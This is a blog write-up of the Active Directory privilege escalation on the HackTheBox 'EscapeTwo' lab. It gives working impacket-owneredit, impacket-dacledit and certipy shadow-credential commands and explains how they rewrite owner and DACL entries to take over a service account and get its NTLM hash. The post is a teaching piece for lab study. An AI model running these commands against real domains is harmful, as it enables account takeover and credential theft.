---
title: Abusing WriteOwner Rights in Detail
date: 2025-05-29 17:00:00 +0100
categories: [Cybersecurity, Active Directory]
tags: [cybersecurity, learning, htb, ctf, pentesting, ad, active-directory, write-owner, escapetwo]     # TAG names should always be lowercase
---

Hi again! It's been... a while? Clearly, I wasn't capable of maintaining this blog after, wow, 4 years of nothing. That really takes a lot of effort to not write anything here.

So, let's start again, but this time I'll get straight to the point.

Recently, I was working through some HTB easy-medium machines and tackled **EscapeTwo**, which is rated as an Easy one. In my opinion, it's "Easy" thanks to some tools we now rely on a lot, specifically **Bloodhound**, which gives you the steps to follow to abuse any weird permission in an AD. But this sometimes leads to people using those documented commands directly and not really understanding what they're doing. I've been in this position too, but over the years, I've tried to always understand the basics in these situations. So, the objective for this post is to contribute a little bit to that understanding.

> **Spoiler Alert:** This will uncover some parts of the EscapeTwo box PrivEsc!

This box basically used the **WriteOwner** privilege of the `ryan` user over `ca_svc` to gain control over it, which is a **CertPublisher** and allows for some extra abilities.

But what does **WriteOwner** actually allow, and how do the tools we use work?

---

## Modify Owner

![Owneredit flow](/assets/img/owneredit.png)

Our first step is to **change the Owner** of the `ca_svc` object using **impacket-owneredit**.

```bash
impacket-owneredit -dc-ip 10.10.11.51 -action write -new-owner 'ryan' -target 'ca_svc' sequel.htb/ryan:PASS
```

*To be clear for the most beginners: these permissions are managed by the **LDAP** service, so every communication will be with LDAP, which is the service that manages users and permissions.*

To do this, `impacket-owneredit` starts a session in LDAP with the credentials we have, `ryan` in this case.  
Then we retrieve from LDAP the [`nTSecurityDescriptor`](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ntsecuritydescriptor#windows-server-2012) field of the target user using its **SAMAccountName**, `ca_svc`. This field contains two important attributes: the **Owner** of the Object (which is what we will modify now), and the **ACL (or DACL)** of the object (which we'll talk about in the following steps).

For those who want a bit more detail about this field, its format looks something like this:

```
O:DAG:DAD:AI(A;;LCRPLORC;;;PS)(A;;RC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AO)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;CI;WO;;;S-1-5-21-548670397-972687484-3496335370-1114)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(OA;;RPWP;e45795b2-9455-11d1-aebd-0000f80367c1;;PS)(OA;;RPWP;e45795b3-9455-11d1-aebd-0000f80367c1;;PS)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;CR;ab721a54-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;CR;ab721a56-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;RPWP;77b5b886-944a-11d1-aebd-0000f80367c1;;PS)(OA;;RP;e48d0154-bcf8-11d1-8702-00c04fb96050;;AU)(OA;;RP;77b5b886-944a-11d1-aebd-0000f80367c1;;AU)(OA;;RP;e45795b3-9455-11d1-aebd-0000f80367c1;;AU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;;AU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;RS)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;RS)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;RS)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;RS)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIID;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-548670397-972687484-3496335370-526)(OA;CIID;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-548670397-972687484-3496335370-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIOID;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIID;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;OICIID;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIID;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-548670397-972687484-3496335370-519)(A;CIID;LC;;;RU)(A;CIID;CCLCSWRPWPLOCRSDRCWDWO;;;BA)
```

But well... that's a bit hard to read, so here's a reduced version that we'll look into:

```
O:DAG:DAD:AI(A;;LCRPLORC;;;PS)(A;;RC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AO)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;CI;WO;;;S-1-5-21-548670397-972687484-3496335370-1114)
```

This is still difficult to read, but it's what this script is editing. Anyway, a more human-readable reduced version will look like this:

```
Owner: SEQUEL\Domain Admins
Group: SEQUEL\Domain Admins

DACL:
    AceQualifier           : AccessAllowed
    ObjectDN               : CN=Certification Authority,CN=Users,DC=sequel,DC=htb
    ActiveDirectoryRights  : ReadProperty
    ObjectAceType          : User-Account-Restrictions
    ObjectSID              : S-1-5-21-548670397-972687484-3496335370-1607
    InheritanceFlags       : None
    BinaryLength           : 56
    AceType                : AccessAllowedObject
    ObjectAceFlags         : ObjectAceTypePresent
    IsCallback             : False
    PropagationFlags       : None
    SecurityIdentifier     : S-1-5-21-548670397-972687484-3496335370-553
    AccessMask             : 16
    AuditFlags             : None
    IsInherited            : False
    AceFlags               : None
    InheritedObjectAceType : All
    OpaqueLength           : 0

    AceQualifier           : AccessAllowed
    ObjectDN               : CN=Certification Authority,CN=Users,DC=sequel,DC=htb
    ActiveDirectoryRights  : ReadProperty
    ObjectAceType          : User-Logon
    ObjectSID              : S-1-5-21-548670397-972687484-3496335370-1607
    InheritanceFlags       : None
    BinaryLength           : 56
    AceType                : AccessAllowedObject
    ObjectAceFlags         : ObjectAceTypePresent
    IsCallback             : False
    PropagationFlags       : None
    SecurityIdentifier     : S-1-5-21-548670397-972687484-3496335370-553
    AccessMask             : 16
    AuditFlags             : None
    IsInherited            : False
    AceFlags               : None
    InheritedObjectAceType : All
    OpaqueLength           : 0

    AceType               : AccessAllowed
    ObjectDN              : CN=Certification Authority,CN=Users,DC=sequel,DC=htb
    ActiveDirectoryRights : WriteOwner
    OpaqueLength          : 0
    ObjectSID             : S-1-5-21-548670397-972687484-3496335370-1607
    InheritanceFlags      : ContainerInherit
    BinaryLength          : 36
    IsInherited           : False
    IsCallback            : False
    PropagationFlags      : None
    SecurityIdentifier    : S-1-5-21-548670397-972687484-3496335370-1114
    AccessMask            : 524288
    AuditFlags            : None
    AceFlags              : ContainerInherit
    AceQualifier          : AccessAllowed
```

Basically, this is formed as four values (see [reference](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format?redirectedfrom=MSDN)):

- **O:** Owner  
- **G:** Group  
- **D:** DACL  
- **S:** SACL (Not present in this example)

In our example:  
- **O:** DA (which corresponds to [SDDL_DOMAIN_ADMINISTRATORS](https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings))  
- **G:** DA (SDDL_DOMAIN_ADMINISTRATORS)  
- **D:** A list of ACEs (**Access Control Entry**)  

Now, we want to **modify the Owner**, so instead of `O:DA`, we want to put `ryan` as the owner. Since `ryan` is not a default user and doesn't have a known SID String, instead of two letters, we will put his **SID**.

To obtain it, the script will query LDAP for this information. We can do it in PowerShell with:

```
Get-ADUser ryan -Properties objectSid | Select-Object Name, objectSid

Name        objectSid
----        ---------
Ryan Howard S-1-5-21-548670397-972687484-3496335370-1114
```

So the `nTSecurityDescriptor` will look like:

```
O:S-1-5-21-548670397-972687484-3496335370-1114G:DAD:AI ...
```

Querying those changes to LDAP will give us **ownership over** `ca_svc`.



---

## DACL Edit

![DACLEdit flow](/assets/img/dacledit.png)

The next step is using **impacket-dacledit**. This script does the same first steps until obtaining the `nTSecurityDescriptor`, and as you probably already guessed, it will modify the **DACL** we were talking about before.

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:PASS -dc-ip 10.10.11.51
```

#### But what is the DACL?  
**DACL** stands for **Discretionary Access Control List** (sometimes referred to as ACL), which, as its name suggests, is a list. This list contains **ACEs** (**Access Control Entries**), which are every specified permission over our object.

Using the same EscapeTwo example, the reduced DACL string looks like this:

```
D:AI(A;;LCRPLORC;;;PS)(A;;RC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AO)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;CI;WO;;;S-1-5-21-548670397-972687484-3496335370-1114)
```

Here, `AI` corresponds to [SDDL_AUTO_INHERITED](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format?redirectedfrom=MSDN), meaning it will inherit the group DACL, and following adds any other specific permission on this object. Each element between parentheses represents an **ACE**. If we look at the last one, we see something familiar:

```
(A;CI;WO;;;S-1-5-21-548670397-972687484-3496335370-1114)
```

This **SID** is `ryan`'s, and we can see here this **WriteOwner** permission set as `WO`. More human-readable, it will look like:

```
AceType               : AccessAllowed
ObjectDN              : CN=Certification Authority,CN=Users,DC=sequel,DC=htb
ActiveDirectoryRights : WriteOwner <---- PERMISSION
OpaqueLength          : 0
ObjectSID             : S-1-5-21-548670397-972687484-3496335370-1607
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-548670397-972687484-3496335370-1114 <--- ryan SID
AccessMask            : 524288
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

So, okay, we asked LDAP for this DACL, now what? Well, in the previous step, we changed the owner of this object to `ryan`. Now, we are allowed to **modify those ACEs**, and as we specified in the arguments, we will **add a new ACE** that specifies **FullControl** to `ca_svc`. The following ACE will be added:

```
(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-548670397-972687484-3496335370-1114)
```

As we can see, now, instead of `WO`, the third value contains a bunch of rights, those are every single AD-defined right, so we have **total control over the object** when we act as `ryan`.

```
AceType               : AccessAllowed
ObjectDN              : CN=Certification Authority,CN=Users,DC=sequel,DC=htb
ActiveDirectoryRights : CreateChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner <---- HERE
OpaqueLength          : 0
ObjectSID             : S-1-5-21-548670397-972687484-3496335370-1607
InheritanceFlags      : ContainerInherit
BinaryLength          : 24
IsInherited           : True
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-32-544
AccessMask            : 983485
AuditFlags            : None
AceFlags              : ContainerInherit, Inherited
AceQualifier          : AccessAllowed

```
---

## Obtaining Shadow Credentials

This part goes a bit beyond the original topic, since we already abused WriteOwner, but leaving the path unfinished felt odd also I think it gives a nice example of what **FullControl** allows. So, let's see how to complete the exploitation. Since this isn't the main focus, I won't go into extensive detail.

This step is specific to this case, as we now have FullControl over a **CertPublishers** user who can issue certificates. For this, we'll use **certipy**.

We use the command:  
```bash
certipy shadow auto -username ryan@sequel.htb -password PASS -account ca_svc -dc-ip 10.10.11.51
```

**Shadow** refers to obtaining a shadow credential, and **auto** is a multi-step process where a new Key Credential is added, the NTLM hash is obtained, and then the Key Credential is deleted to avoid leaving any trace.

![Certipy flow](/assets/img/certipy.png)

Here's what certipy does:

1. **Creates an LDAP session** as `ryan`.
2. **Generates an X509 Certificate** and a KeyCredential for this certificate.
3. **Modifies the `ca_svc` `msDS-KeyCredentialLink` attribute** to include the newly created public key.
4. Using this KeyCredential, it auths through **Kerberos PKINIT** (which allows certificate-based authentication, this is what a shadow credential is), obtains a **TGT** (Ticket Granting Ticket)
5. Then requests a **TGS** (Ticket Granting Service) for `ca_svc`.
6. Since we can get the **encryption key** of this user, we can **decrypt the TGS** and finally **obtain the NTLM hash**, which can be used with Pass-the-Hash.
7. Before finishing, the key is deleted from `msDS-KeyCredentialLink` to remove any trace.

With this, we have full and easy access to `ca_svc`. The PrivEsc for this machine doesn't end here, but that's a topic for another post.

---

## Conclusion

So that's it, a bit of Active Directory in detail. It's a simple topic, but I think posts like this can help a lot of newcomers, and honestly, it also helps me reinforce my own understanding of how this environment works.

I really like the Shadow Credentials step, so I'll probably write something more in-depth about it in the future, since it's a really interesting way of authenticating in AD and has a lot of details.
